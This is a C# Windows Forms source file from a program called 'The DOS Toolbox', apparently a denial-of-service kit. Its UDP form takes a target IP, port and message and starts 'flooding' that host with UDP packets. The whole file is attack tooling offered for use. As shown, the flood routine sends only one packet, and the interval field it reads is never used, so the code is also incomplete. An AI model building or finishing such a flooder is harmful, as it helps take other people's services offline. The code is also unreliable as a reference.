//////////////////////////////////////////////
/// jack-debug, The DOS Toolbox 26/09/2020 ///
//////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace The_DOS_Toolbox
{
    public partial class UDP : Form
    {
        public bool active = false;
        public UDP()
        {
            InitializeComponent();
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var CheckClient = new WebClient())
                using (CheckClient.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string intervall = intervalTxt.Text;
            int value;
            if (int.TryParse(intervall, out value))
            {
                bool internetcon = CheckForInternetConnection(); // this checks the internet connection
                if (internetcon)
                {
                    if (active)
                    {
                        MessageBox.Show("Flooding is still in progress.");
                    }
                    else
                    {
                        MessageBox.Show("Flooding started.");
                        active = true;
                        flood();
                    }
                }
                else
                {
                    MessageBox.Show("You do not have an internet connection, reconnect and try again.");
                    System.Windows.Forms.Application.Exit();
                }
            }
            else
            {
                MessageBox.Show("Incorrect interval. Please enter an integer.");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            active = false;
        }

        private void flood()
        {
            if (active)
            {
                string ipaddr = ipTxt.Text;
                int por = Int32.Parse(portTxt.Text);
                UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
                try
                {
                    client.Connect(ipaddr, por); // this is where the fun starts 
                    byte[] sendBytes = Encoding.ASCII.GetBytes(messageTxt.Text);
                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;
                }
                catch
                {
                    MessageBox.Show("There was an error. Ensure that you have an internet connection and that all the data is entered correctly.");
                    active = false;
                }
            }
        }
    }
}
